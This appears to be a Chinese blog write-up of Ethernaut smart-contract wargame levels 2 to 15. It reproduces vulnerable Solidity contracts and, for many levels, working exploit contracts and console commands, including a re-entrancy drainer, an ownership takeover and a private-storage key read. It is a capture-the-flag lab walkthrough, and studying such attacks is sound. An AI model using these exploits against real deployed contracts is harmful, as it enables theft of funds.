+<h3 id="level-2-Fallout"><a href="#level-2-Fallout" class="headerlink" title="level 2 Fallout"></a>level 2 Fallout</h3><blockquote>
+<p>Claim ownership of the contract below to complete this level.<br>  Things that might help<br>Solidity Remix IDE</p>
+</blockquote>
+<pre><code class="java">pragma solidity ^0.4.18;
+
+import &#39;zeppelin-solidity/contracts/ownership/Ownable.sol&#39;;
+
+contract Fallout is Ownable {
+
+  mapping (address =&gt; uint) allocations;
+
+  /* constructor */
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+  function allocate() public payable {
+    allocations[msg.sender] += msg.value;
+  }
+
+  function sendAllocation(address allocator) public {
+    require(allocations[allocator] &gt; 0);
+    allocator.transfer(allocations[allocator]);
+  }
+
+  function collectAllocations() public onlyOwner {
+    msg.sender.transfer(this.balance);
+  }
+
+  function allocatorBalance(address allocator) public view returns (uint) {
+    return allocations[allocator];
+  }
+}</code></pre>
+<p>稍微看看，这题目，Fallout里面的Fal1out函数(名字不同，并不是构造函数呢)，直接可以调用的。</p>
+<p>所以，</p>
+<pre><code>1. 调用Fal1out函数，成为owner
+contract.Fal1out()
+此时，我们是owner了，通过调用
+contract.owner()可以看到
+2. 调用collectAllocations函数可以转走所有钱
+contract.collectAllocations()</code></pre><blockquote>
+<p>That was silly wasn’t it? Real world contracts must be much more secure than this and so must it be much harder to hack them right?</p>
+<p>Well… Not quite.</p>
+<p>The story of Rubixi is a very well known case in the Ethereum ecosystem. The company changed its name from ‘Dynamic Pyramid’ to ‘Rubixi’ but somehow they didn’t rename the constructor method of its contract:</p>
+</blockquote>
+<blockquote>
+<pre><code>contract Rubixi {
+  address private owner;
+  function DynamicPyramid() { owner = msg.sender; }
+  function collectAllFees() { owner.transfer(this.balance) }
+  ...</code></pre></blockquote>
+<blockquote>
+<p>This allowed the attacker to call the old constructor and claim ownership of the contract, and steal some funds. Yep. Big mistakes can be made in smart-contract-land.</p>
+</blockquote>
+<h3 id="level-3-Coin-Flip"><a href="#level-3-Coin-Flip" class="headerlink" title="level 3 Coin Flip"></a>level 3 Coin Flip</h3><blockquote>
+<p>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you’ll need to use your psychic abilities to guess the correct outcome 10 times in a row. </p>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract CoinFlip {
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  function CoinFlip() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(block.blockhash(block.number-1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}</code></pre>
+<p>很显然，你要知道，想要在智能合约中实现随机是很难的，所以，我们完全可以部署一个智能合约，算出答案后调用相应的函数</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract CoinFlip {
+  uint256 public consecutiveWins;
+  uint256 lastHash;
+  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+  function CoinFlip() public {
+    consecutiveWins = 0;
+  }
+
+  function flip(bool _guess) public returns (bool) {
+    uint256 blockValue = uint256(block.blockhash(block.number-1));
+
+    if (lastHash == blockValue) {
+      revert();
+    }
+
+    lastHash = blockValue;
+    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+    bool side = coinFlip == 1 ? true : false;
+
+    if (side == _guess) {
+      consecutiveWins++;
+      return true;
+    } else {
+      consecutiveWins = 0;
+      return false;
+    }
+  }
+}
+
+
+contract Level3Exp {
+    address public vulnerable_contract;
+    address public owner;
+    CoinFlip private A;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    event Attack(address indexed from, uint guess);
+
+    modifier OwnerOnly(){
+            require(msg.sender == owner);
+            _;
+    }
+
+    function Level3Exp() public {
+        owner = msg.sender;
+    }
+
+    function init(address vuln_addr) public OwnerOnly {
+        vulnerable_contract = vuln_addr;
+        A = CoinFlip(vulnerable_contract);
+
+    }
+
+    function attack() public OwnerOnly {
+        uint256 blockValue = uint256(block.blockhash(block.number-1));
+
+        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);
+        bool side = coinFlip == 1 ? true : false;
+        A.flip(side);
+    }
+}</code></pre>
+<p>所以，怎么在这个挑战中部署合约呢？</p>
+<p>我们可以通过Remix和MetaMask配合使用（用得舒心）。</p>
+<p>感觉不难，自己摸索下就OK啦。</p>
+<blockquote>
+<p>Generating random numbers in solidity can be tricky. There currently isn’t a native way to generate them, and everything you use in smart contracts is publicly visible, including the local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.</p>
+<p>Some options include using Bitcoin block headers (verified through <a href="http://btcrelay.org/" target="_blank" rel="noopener">BTC Relay</a>), <a href="https://github.com/randao/randao" target="_blank" rel="noopener">RANDAO</a>, or <a href="http://www.oraclize.it/" target="_blank" rel="noopener">Oraclize</a>).</p>
+</blockquote>
+<h3 id="level-4-Telephone"><a href="#level-4-Telephone" class="headerlink" title="level 4 Telephone"></a>level 4 Telephone</h3><blockquote>
+<p>Claim ownership of the contract below to complete this level.</p>
+<p>  Things that might help</p>
+<ul>
+<li>See the Help page above, section “Beyond the console”</li>
+</ul>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Telephone {
+
+  address public owner;
+
+  function Telephone() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}</code></pre>
+<p>这里很简单啦，只是需要tx.origin和msg.sender不同而已。</p>
+<p>我们知道，当通过call调用别的合约时，tx.origin没有变，但是msg.sender是会变化的。</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Telephone {
+
+  address public owner;
+
+  function Telephone() public {
+    owner = msg.sender;
+  }
+
+  function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+}
+
+contract Level4Exp {
+    address public vulnerable_contract;
+    address public owner;
+    Telephone private A;
+    event Attack(address indexed from, uint guess);
+
+    modifier OwnerOnly(){
+            require(msg.sender == owner);
+            _;
+    }
+
+    function Level4Exp() public {
+        owner = msg.sender;
+    }
+
+    function init(address vuln_addr) public OwnerOnly {
+        vulnerable_contract = vuln_addr;
+        A = Telephone(vulnerable_contract);
+
+    }
+
+    function attack() public OwnerOnly {
+        A.changeOwner(msg.sender);
+    }
+}</code></pre>
+<blockquote>
+<p>While this example may be simple, confusing <code>tx.origin</code> with <code>msg.sender</code> can lead to phishing-style attacks, such as <a href="https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/" target="_blank" rel="noopener">this</a>.</p>
+<p>An example of a possible attack is outlined below.</p>
+<ol>
+<li>Use <code>tx.origin</code> to determine whose tokens to transfer, e.g.</li>
+</ol>
+<pre><code>function transfer(address _to, uint _value) {
+  tokens[tx.origin] -= _value;
+  tokens[_to] += _value;
+}</code></pre></blockquote>
+<blockquote>
+<ol>
+<li>Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.</li>
+</ol>
+<pre><code>function () payable {
+  token.transfer(attackerAddress, 10000);
+}</code></pre></blockquote>
+<blockquote>
+<ol>
+<li>In this scenario, <code>tx.origin</code> will be the victim’s address (while <code>msg.sender</code> will be the malicious contract’s address), resulting in the funds being transferred from the victim to the attacker.</li>
+</ol>
+</blockquote>
+<h3 id="level-5-Token"><a href="#level-5-Token" class="headerlink" title="level 5 Token"></a>level 5 Token</h3><blockquote>
+<p>The goal of this level is for you to hack the basic token contract below.</p>
+<p>You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.</p>
+<p>  Things that might help:</p>
+<ul>
+<li>What is an odometer?</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Token {
+
+  mapping(address =&gt; uint) balances;
+  uint public totalSupply;
+
+  function Token(uint _initialSupply) public {
+    balances[msg.sender] = totalSupply = _initialSupply;
+  }
+
+  function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value &gt;= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+
+  function balanceOf(address _owner) public view returns (uint balance) {
+    return balances[_owner];
+  }
+}</code></pre>
+<p>很简单可以看出来，整数下溢。</p>
+<pre><code>随便找个地址，调用transfer函数，转30(&gt;20)过去，你就会有2**256-10</code></pre><blockquote>
+<p>Overflows are very common in solidity and must be checked for with control statements such as:</p>
+<pre><code>if(a + c &gt; a) {
+  a = a + c;
+}</code></pre></blockquote>
+<blockquote>
+<p>An easier alternative is to use OpenZeppelin’s SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:</p>
+<pre><code>a = a.add(c);</code></pre><p>If there is an overflow, the code will revert.</p>
+</blockquote>
+<h3 id="level-6-Delegation"><a href="#level-6-Delegation" class="headerlink" title="level 6 Delegation"></a>level 6 Delegation</h3><blockquote>
+<p>The goal of this level is for you claim ownership of the instance you are given.</p>
+<p>  Things that might help</p>
+<ul>
+<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.</li>
+<li>Fallback methods</li>
+<li>Method ids</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Delegate {
+
+  address public owner;
+
+  function Delegate(address _owner) public {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  function Delegation(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  function() public {
+    if(delegate.delegatecall(msg.data)) {
+      this;
+    }
+  }
+}</code></pre>
+<p>可以说是非常明显了，直接造msg.data，调用Delegation的fallback函数，然后，从外部获取代码并进行调用，简单的，调用Delgate的pwn函数。</p>
+<pre><code>我们知道，
+contract.sendTransaction({data:web3.sha3(&quot;pwn()&quot;).slice(0,10)})
+调用delegate里面的pwn函数</code></pre><blockquote>
+<p>Usage of <code>delegatecall</code> is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying “here, -other contract- or -other library-, do whatever you want with my state”. Delegates have complete access to your contract’s state. The <code>delegatecall</code> function is a powerful feature, but a dangerous one, and must be used with extreme care.</p>
+<p>Please refer to the <a href="https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7" target="_blank" rel="noopener">The Parity Wallet Hack Explained</a> article for an accurate explanation of how this idea was used to steal 30M USD.</p>
+</blockquote>
+<h3 id="level-7-Force"><a href="#level-7-Force" class="headerlink" title="level 7 Force"></a>level 7 Force</h3><blockquote>
+<p>Some contracts will simply not take your money <code>¯\_(ツ)_/¯</code></p>
+<p>The goal of this level is to make the balance of the contract greater than zero.</p>
+<p>  Things that might help:</p>
+<ul>
+<li>Fallback methods</li>
+<li>Sometimes the best way to attack a contract is with another contract.</li>
+<li>See the Help page above, section “Beyond the console”</li>
+</ul>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Force {/*
+
+                   MEOW ?
+         /\_/\   /
+    ____/ o o \
+  /~____  =ø= /
+ (______)__m_m)
+
+*/}</code></pre>
+<p>这题有点意思的样子，但是只是要该合约balance大于0</p>
+<p>办法有的。</p>
+<p>有一些办法是现阶段无法拒绝往里面转钱的，一是用这个地址去挖矿，二是通过selfdestruct强行转钱。</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Level7Exp {
+    address public vulnerable_contract;
+    address public owner;
+
+    modifier OwnerOnly(){
+            require(msg.sender == owner);
+            _;
+    }
+
+    function Level7Exp() public {
+        owner = msg.sender;
+    }
+
+    function init(address vuln_addr) public payable OwnerOnly {
+        vulnerable_contract = vuln_addr;
+    }
+
+    function attack() public OwnerOnly {
+        selfdestruct(vulnerable_contract);
+    }
+}</code></pre>
+<pre><code>1. 部署合约
+2. init传入目标合约地址，同时调用init时转一点ether进去
+3. 调用attack</code></pre><blockquote>
+<p>In solidity, for a contract to be able to receive ether, the fallback function must be marked ‘payable’.</p>
+<p>However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant <code>this.balance == 0</code> for any contract logic.</p>
+</blockquote>
+<h3 id="level-8-Vault"><a href="#level-8-Vault" class="headerlink" title="level 8 Vault"></a>level 8 Vault</h3><blockquote>
+<p> Unlock the vault to pass the level! </p>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Vault {
+  bool public locked;
+  bytes32 private password;
+
+  function Vault(bytes32 _password) public {
+    locked = true;
+    password = _password;
+  }
+
+  function unlock(bytes32 _password) public {
+    if (password == _password) {
+      locked = false;
+    }
+  }
+}</code></pre>
+<p>非常天真地以为private就不可见了么，智能合约的每一笔交易是公开可见的。</p>
+<pre><code>web3.eth.getStorageAt(contract.address,1,(e,v)=&gt;alert(web3.toAscii(v)))
+可以看到弹窗内容即为密码
+A very strong secret password :)
+然后，调用
+contract.unlock(&quot;A very strong secret password :)&quot;)</code></pre><blockquote>
+<p>It’s important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.</p>
+<p>To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. <a href="https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/" target="_blank" rel="noopener">zk-SNARKs</a> provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.</p>
+<p>Get new instanceGo to the next level!</p>
+</blockquote>
+<h3 id="level-9-King"><a href="#level-9-King" class="headerlink" title="level 9 King"></a>level 9 King</h3><blockquote>
+<p>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD</p>
+<p>Such a fun game. Your goal is to break it.</p>
+<p>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.</p>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+import &#39;zeppelin-solidity/contracts/ownership/Ownable.sol&#39;;
+
+contract King is Ownable {
+
+  address public king;
+  uint public prize;
+
+  function King() public payable {
+    king = msg.sender;
+    prize = msg.value;
+  }
+
+  function() external payable {
+    require(msg.value &gt;= prize || msg.sender == owner);
+    king.transfer(msg.value);
+    king = msg.sender;
+    prize = msg.value;
+  }
+}</code></pre>
+<p>嗯，只要我们成为国王，然后，我们身份是合约，</p>
+<p>如果我们没有定义fallback函数或者fallback函数没有payable修饰符或者fallback函数一直是revert，则transfer就一直会失败而回滚。</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Level9Exp {
+
+    function attack(address vulnerable_contract) public payable {
+        vulnerable_contract.call.gas(1000000).value(msg.value)();
+    }
+
+    function () public payable{
+        revert();
+    }
+}</code></pre>
+<p>attack的时候注意要转比prize多钱即可。（注意：不知道是chrome的插件有问题还是什么，自己手动调节下gas price和gas limit，确保不会报错transaction underprice和不会运行一会儿out-of-gas）</p>
+<blockquote>
+<p>Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.</p>
+<p>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html" target="_blank" rel="noopener">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html" target="_blank" rel="noopener">King of the Ether Postmortem</a></p>
+</blockquote>
+<h3 id="level-10-Re-entrancy"><a href="#level-10-Re-entrancy" class="headerlink" title="level 10 Re-entrancy"></a>level 10 Re-entrancy</h3><blockquote>
+<p>The goal of this level is for you to steal all the funds from the contract.</p>
+<p>  Things that might help:</p>
+<ul>
+<li>Untrusted contracts can execute code where you least expect it.</li>
+<li>Fallback methods</li>
+<li>Throw/revert bubbling</li>
+<li>Sometimes the best way to attack a contract is with another contract.</li>
+<li>See the Help page above, section “Beyond the console”</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Reentrance {
+
+  mapping(address =&gt; uint) public balances;
+
+  function donate(address _to) public payable {
+    balances[_to] += msg.value;
+  }
+
+  function balanceOf(address _who) public view returns (uint balance) {
+    return balances[_who];
+  }
+
+  function withdraw(uint _amount) public {
+    if(balances[msg.sender] &gt;= _amount) {
+      if(msg.sender.call.value(_amount)()) {
+        _amount;
+      }
+      balances[msg.sender] -= _amount;
+    }
+  }
+
+  function() public payable {}
+}</code></pre>
+<p>利用自己部署的合约调用目标合约的withdraw，然后，它通过call向我们转账，这时，调用了我们的fallback函数并且带上了所有剩余的gas，我们在fallback中调用该合约的withdraw函数，就能够再次转钱啦，这时我们的fallback函数就放行就ok，这里可以顺带来个整数下溢，美滋滋。</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Level10Exp {
+    address public owner;
+    address public vulnerable_contract;
+    bool public attacked;
+    uint amount;
+
+    modifier OwnerOnly(){
+        require(msg.sender == owner);
+        _;
+    }
+
+    function Level10Exp(){
+        owner = msg.sender;
+    }
+    /// 这里记得转一点点钱，1wei就够了
+    function init(address addr) public payable{
+        vulnerable_contract = addr;
+        attacked = false;
+        amount = msg.value;
+        vulnerable_contract.call.value(msg.value)(bytes4(keccak256(&quot;donate(address)&quot;)),this);
+
+    }
+
+    function attack() public {
+        require(!attacked);
+        vulnerable_contract.call(bytes4(keccak256(&quot;withdraw(uint256)&quot;)),amount);
+    }
+
+    function withdraw(uint balance) public {
+         vulnerable_contract.call(bytes4(keccak256(&quot;withdraw(uint256)&quot;)),balance);
+    }
+
+    function paolu() public OwnerOnly(){
+        selfdestruct(owner);
+    }
+
+    function() public payable {
+        if(!attacked){
+            vulnerable_contract.call(bytes4(keccak256(&quot;withdraw(uint256)&quot;)),amount);  // 这里可以导致整数下溢了，后面可以随意取钱了
+            attacked = true;
+        }
+    }
+}</code></pre>
+<blockquote>
+<p>Use <code>transfer</code> to move funds out of your contract, since it <code>throw</code>s and limits gas forwarded. Low level functions like <code>call</code> and <code>send</code> just return false but don’t interrupt the execution flow when the receiving contract fails.</p>
+<p>Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and <em>re-enter</em> your contract, possibly messing up your state/logic.</p>
+<p>Re-entrancy is a common attack. You should always be prepared for it!</p>
+<p> The DAO Hack</p>
+<p>The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See <a href="https://blog.zeppelin.solutions/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942" target="_blank" rel="noopener">15 lines of code that could have prevented TheDAO Hack</a>.</p>
+</blockquote>
+<h3 id="level-11-Elevator"><a href="#level-11-Elevator" class="headerlink" title="level 11 Elevator"></a>level 11 Elevator</h3><blockquote>
+<p>This elevator won’t let you reach the top of your building. Right?</p>
+<p> Things that might help:</p>
+<ul>
+<li>Sometimes solidity is not good at keeping promises.</li>
+<li>This <code>Elevator</code> expects to be used from a <code>Building</code>.</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+
+interface Building {
+  function isLastFloor(uint) view public returns (bool);
+}
+
+
+contract Elevator {
+  bool public top;
+  uint public floor;
+
+  function goTo(uint _floor) public {
+    Building building = Building(msg.sender);
+
+    if (! building.isLastFloor(_floor)) {
+      floor = _floor;
+      top = building.isLastFloor(floor);
+    }
+  }
+}</code></pre>
+<p>这里，我们要部署一个合约，这个合约继承Building接口，然后，第一次调用返回false，第二次调用返回true，就OK啦。注意到这里函数isLastFloor是被view修饰的，这代表着我们不能进行修改变量，那么我们要怎么判断是第一次调用还是第二次呢？</p>
+<p>有看到网上说solidity没有强制view修饰，但是我用remix时发现试试报错的。所以，想别的办法，</p>
+<p>可以看到先后两次调用了building.isLastFloor，而且参数是一样的，可以想想两次调用有什么不同，容易想到剩余的gas不同，所以，exp如下</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+
+interface Building {
+    function isLastFloor(uint) view public returns (bool);
+}
+
+
+contract Level11Exp is Building{
+    bool public lastFloor;
+
+    function isLastFloor(uint i) view public returns (bool){
+        return gasleft()%2==0;
+    }
+
+    function attack(address vulnerable_contract) public {
+        vulnerable_contract.call(bytes4(keccak256(&quot;goTo(uint256)&quot;)),1);
+    }
+
+}</code></pre>
+<p>尝试几次就能OK。</p>
+<blockquote>
+<p>Currently, the Solidity compiler does nothing to enforce that a <code>view</code> or <code>constant</code> function is not modifying state. The same applies to <code>pure</code> functions, which should not read state but they can. Make sure you read <a href="http://solidity.readthedocs.io/en/develop/contracts.html#view-functions" target="_blank" rel="noopener">Solidity’s documentation</a> and learn its caveats. </p>
+</blockquote>
+<p>可以看到官方预期解都是用的不强制view修饰符，所以，我的是非预期Orz。</p>
+<h3 id="level-12-Privacy"><a href="#level-12-Privacy" class="headerlink" title="level 12 Privacy"></a>level 12 Privacy</h3><blockquote>
+<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
+<p>Unlock this contract to beat the level.</p>
+<p>Things that might help:</p>
+<ul>
+<li>Understanding how storage works</li>
+<li>Understanding how parameter parsing works</li>
+<li>Understanding how casting works</li>
+</ul>
+<p>Tips:</p>
+<ul>
+<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract Privacy {
+
+  bool public locked = true;
+  uint256 public constant ID = block.timestamp;
+  uint8 private flattening = 10;
+  uint8 private denomination = 255;
+  uint16 private awkwardness = uint16(now);
+  bytes32[3] private data;
+
+  function Privacy(bytes32[3] _data) public {
+    data = _data;
+  }
+
+  function unlock(bytes16 _key) public {
+    require(_key == bytes16(data[2]));
+    locked = false;
+  }
+
+  /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
+      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
+      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
+      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
+      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
+  */
+}</code></pre>
+<p>容易拿到数据</p>
+<pre><code>0x000000000000000000000000000000000000000000000000000000af74ff0a01
+0x02c816cfee7e90b75ea59405dafb348c6e90765b95ffc1abee6d38f5bd940043
+0xa6d0b6d669da4f4889c1767b1f17798032fbdc3efdd7393e366afee930b13387
+0x9c9841d9296eb0165baf6a18395b289a21e6d261e883d3d6a5132abe378374d6
+0x0000000000000000000000000000000000000000000000000000000000000000
+0x0000000000000000000000000000000000000000000000000000000000000000
+0x0000000000000000000000000000000000000000000000000000000000000000
+后面都是0了</code></pre><p>有一些数据对齐之类的东西啦</p>
+<p>看数据类型，可以知道</p>
+<p>a6d0b6d669da4f4889c1767b1f17798032fbdc3efdd7393e366afee930b13387</p>
+<p>这个应该就是data[2]</p>
+<p>转成bytes16则取前16位，得到结果</p>
+<p>a6d0b6d669da4f4889c1767b1f177980</p>
+<p>分析下数据和提交数据就OK了，有空回头再看。</p>
+<h3 id="level-13-Gatekeeper-One"><a href="#level-13-Gatekeeper-One" class="headerlink" title="level 13 Gatekeeper One"></a>level 13 Gatekeeper One</h3><blockquote>
+<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
+<p> Things that might help:</p>
+<ul>
+<li>Remember what you’ve learned from the Telephone and Token levels.</li>
+<li>You can learn more about the <code>msg.gas</code> special variable, or its preferred alias <code>gasleft()</code>, in Solidity’s documentation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/units-and-global-variables.html" target="_blank" rel="noopener">here</a> and <a href="http://solidity.readthedocs.io/en/v0.4.23/control-structures.html#external-function-calls" target="_blank" rel="noopener">here</a>).</li>
+</ul>
+</blockquote>
+<p>源代码</p>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract GatekeeperOne {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    require(msg.gas % 8191 == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint32(_gateKey) == uint16(_gateKey));
+    require(uint32(_gateKey) != uint64(_gateKey));
+    require(uint32(_gateKey) == uint16(tx.origin));
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}</code></pre>
+<p>大家自己尝试下吧^^</p>
+<h3 id="level-14-Gatekeeper-Two"><a href="#level-14-Gatekeeper-Two" class="headerlink" title="level 14 Gatekeeper Two"></a>level 14 Gatekeeper Two</h3><blockquote>
+<p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
+<p> Things that might help:</p>
+<ul>
+<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
+<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" target="_blank" rel="noopener">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a href="https://ethereum.github.io/yellowpaper/paper.pdf" target="_blank" rel="noopener">yellow paper</a>.</li>
+<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" target="_blank" rel="noopener">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
+</ul>
+<p>Get new instance</p>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+contract GatekeeperTwo {
+
+  address public entrant;
+
+  modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+  }
+
+  modifier gateTwo() {
+    uint x;
+    assembly { x := extcodesize(caller) }
+    require(x == 0);
+    _;
+  }
+
+  modifier gateThree(bytes8 _gateKey) {
+    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
+    _;
+  }
+
+  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    entrant = tx.origin;
+    return true;
+  }
+}</code></pre>
+<p>大家自己尝试下吧^^</p>
+<h3 id="level-15-Naught-Coin"><a href="#level-15-Naught-Coin" class="headerlink" title="level 15 Naught Coin"></a>level 15 Naught Coin</h3><blockquote>
+<p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
+<p>  Things that might help</p>
+<ul>
+<li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" target="_blank" rel="noopener">ERC20</a> Spec</li>
+<li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" target="_blank" rel="noopener">OpenZeppelin</a> codebase</li>
+</ul>
+</blockquote>
+<pre><code class="javascript">pragma solidity ^0.4.18;
+
+import &#39;zeppelin-solidity/contracts/token/ERC20/StandardToken.sol&#39;;
+
+ contract NaughtCoin is StandardToken {
+
+  string public constant name = &#39;NaughtCoin&#39;;
+  string public constant symbol = &#39;0x0&#39;;
+  uint public constant decimals = 18;
+  uint public timeLock = now + 10 years;
+  uint public INITIAL_SUPPLY = 1000000 * (10 ** decimals);
+  address public player;
+
+  function NaughtCoin(address _player) public {
+    player = _player;
+    totalSupply_ = INITIAL_SUPPLY;
+    balances[player] = INITIAL_SUPPLY;
+    Transfer(0x0, player, INITIAL_SUPPLY);
+  }
+
+  function transfer(address _to, uint256 _value) lockTokens public returns(bool) {
+    super.transfer(_to, _value);
+  }
+
+  // Prevent the initial owner from transferring tokens until the timelock has passed
+  modifier lockTokens() {
+    if (msg.sender == player) {
+      require(now &gt; timeLock);
+      if (now &lt; timeLock) {
+        _;
+      }
+    } else {
+     _;
+    }
+  } 
+} </code></pre>
+<p>大家自己尝试下吧^^</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
